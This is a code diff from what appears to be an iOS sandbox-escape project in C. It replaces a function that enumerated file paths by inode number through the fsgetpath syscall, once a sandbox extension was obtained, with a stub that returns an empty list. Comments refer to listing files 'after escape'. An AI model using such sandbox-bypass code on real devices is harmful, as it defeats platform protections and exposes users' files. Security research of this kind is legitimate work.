@@ -11,8 +11,6 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/stat.h>
-#include <sys/attr.h>
 #include <unistd.h>
 #include <xpc/xpc.h>
 
@@ -135,43 +133,15 @@ void bad_query_release(int64_t handle) {
     // TODO: dlopen libsandbox and call sandbox_extension_release(handle) for cleanliness
 }
 
-// bad_query_list: enumerate inodes at `path`, return newline-joined fsgetpath results
+// bad_query_list: stub — SYS_fsgetpath is not in the iOS SDK headers.
+// Use bad_query() to obtain the sandbox extension, then NSFileManager from Swift.
 char *bad_query_list(char *path, int64_t max_inode) {
-    // Obtain a sandbox extension for the target directory first
+    (void)max_inode;
     int64_t handle = bad_query(path, false, NULL, false);
     if (handle < 0) return NULL;
-
-    size_t out_cap = 4096;
-    char *out = malloc(out_cap);
-    if (!out) return NULL;
-    out[0] = '\0';
-    size_t out_len = 0;
-
-    char pathbuf[PATH_MAX];
-
-    for (int64_t ino = 1; ino < max_inode; ino++) {
-        struct attrlist al = { .bitmapcount = ATTR_BIT_MAP_COUNT, .commonattr = ATTR_CMN_FULLPATH };
-        // fsgetpath(buf, bufsize, &fsid_t, inode_number)
-        // Use the variant that takes an inode on the same volume as `path`
-        // We use fsgetpath() syscall directly
-        int r = (int)syscall(SYS_fsgetpath, pathbuf, sizeof(pathbuf), NULL, (uint64_t)ino);
-        if (r != 0) continue;
-
-        // Check if this path is under our target
-        if (strncmp(pathbuf, path, strlen(path)) != 0) continue;
-
-        size_t plen = strlen(pathbuf);
-        while (out_len + plen + 2 > out_cap) {
-            out_cap *= 2;
-            out = realloc(out, out_cap);
-            if (!out) return NULL;
-        }
-        memcpy(out + out_len, pathbuf, plen);
-        out_len += plen;
-        out[out_len++] = '\n';
-        out[out_len] = '\0';
-    }
-
     bad_query_release(handle);
+    // Return empty list — enumerate from Swift using FileManager after escape
+    char *out = malloc(1);
+    if (out) out[0] = '\0';
     return out;
 }
